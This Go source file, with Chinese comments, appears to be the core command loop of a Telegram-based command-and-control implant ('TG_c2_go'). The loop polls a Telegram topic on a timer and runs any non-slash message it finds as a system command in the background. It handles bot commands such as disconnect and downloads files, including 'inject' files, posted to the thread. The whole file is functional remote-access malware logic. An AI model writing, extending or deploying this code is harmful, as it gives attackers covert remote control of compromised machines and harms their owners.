package core

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"TG_c2_go/commands"
	"TG_c2_go/config"
	"TG_c2_go/telegram"
)

// CommandLoop 命令循环处理器
type CommandLoop struct {
	client        *telegram.TelegramClient
	topicManager  *TopicManager
	fileManager   *FileManager
	cmdProcessor  *commands.CommandProcessor
}

// NewCommandLoop 创建新的命令循环
func NewCommandLoop() *CommandLoop {
	return &CommandLoop{
		client:       telegram.NewTelegramClient(),
		topicManager: NewTopicManager(),
		fileManager:  NewFileManager(),
		cmdProcessor: commands.NewCommandProcessor(),
	}
}

// Run 运行主命令循环
func (cl *CommandLoop) Run() error {
	// 状态变量
	var (
		lastCommand       = ""
		lastFileID       = ""
		lastInjectFileID = ""
		updateID         int64 = 0
		cmd              = ""
	)
	
	threadID := config.GetMessageThreadID()
	if threadID == 0 {
		return fmt.Errorf("无效的消息线程ID")
	}
	
	fmt.Println("开始命令循环...")
	
	for {
		var (
			tempCmdFlag     = true
			tempFileFlag    = false
			shouldExecuteCmd = false
		)
		
		sleepTime := config.GetSleepTime()
		fmt.Printf("循环 --- updateID: %d ---\\n", updateID)
		time.Sleep(time.Duration(sleepTime) * time.Second)
		
		// 获取更新，带重试机制
		updates, err := cl.getUpdatesWithRetry(updateID)
		if err != nil {
			fmt.Printf("获取更新失败: %v\\n", err)
			continue
		}
		
		// 处理命令
		if tempUpdateID, tempCmd, err := cl.topicManager.ExtractLastCommandFromTopic(updates, threadID); err == nil {
			if updateID == tempUpdateID {
				tempCmdFlag = false
			} else if lastCommand == tempCmd {
				// 命令未变化，跳过
				fmt.Println("命令未变化")
				tempCmdFlag = false
			} else {
				lastCommand = tempCmd
				cmd = tempCmd
				updateID = tempUpdateID
				
				fmt.Printf("新命令: %s\\n", cmd)
				fmt.Printf("updateID: %d\\n", updateID)
				
				// 检查是否是Bot命令
				isBotCmd, _ := regexp.MatchString(`^/`, cmd)
				if isBotCmd {
					// 处理Bot命令
					err := cl.cmdProcessor.MatchCommand(cmd, updateID)
					if err != nil {
						if err.Error() == "disconnect" {
							fmt.Println("收到断开连接命令，退出程序")
							return nil
						}
						fmt.Printf("处理Bot命令失败: %v\\n", err)
					}
					tempCmdFlag = false // Bot命令已处理
				} else {
					// 系统命令，标记需要执行
					shouldExecuteCmd = true
				}
			}
		} else {
			fmt.Println("没有找到符合条件的命令")
			tempCmdFlag = false
		}
		
		// 处理文件下载
		if fileID, fileType, err := cl.topicManager.ExtractFileIDFromTopic(updates, threadID); err == nil {
			processed, err := cl.fileManager.ProcessFile(fileID, fileType, &lastFileID, &lastInjectFileID)
			if err != nil {
				fmt.Printf("文件处理失败: %v\\n", err)
			}
			tempFileFlag = processed
		} else {
			fmt.Println("没有找到符合条件的文件")
			tempFileFlag = false
		}
		
		// 如果命令和文件都未变化，继续下一轮循环
		if !tempCmdFlag && !tempFileFlag {
			fmt.Println("命令和文件都未变化")
			continue
		}
		
		// 执行系统命令
		if shouldExecuteCmd && !strings.HasPrefix(cmd, "/") && cmd != "" {
			fmt.Printf("执行系统命令: %s\\n", cmd)
			
			// 在新的goroutine中执行命令，避免阻塞
			go func(command string) {
				if err := cl.cmdProcessor.ExecuteSystemCommand(command); err != nil {
					fmt.Printf("系统命令执行失败: %v\\n", err)
				}
			}(cmd)
			
			shouldExecuteCmd = false
		}
	}
}

// getUpdatesWithRetry 带重试机制的获取更新
func (cl *CommandLoop) getUpdatesWithRetry(offset int64) ([]byte, error) {
	maxRetries := 3
	retryDelay := 30 * time.Second
	
	for attempt := 0; attempt < maxRetries; attempt++ {
		updates, err := cl.client.GetUpdates(offset)
		if err == nil {
			return updates, nil
		}
		
		fmt.Printf("获取更新失败 (第%d次尝试): %v\\n", attempt+1, err)
		
		if attempt < maxRetries-1 {
			fmt.Printf("等待%v后重试...\\n", retryDelay)
			time.Sleep(retryDelay)
		}
	}
	
	return nil, fmt.Errorf("获取更新失败，已达到最大重试次数")
}
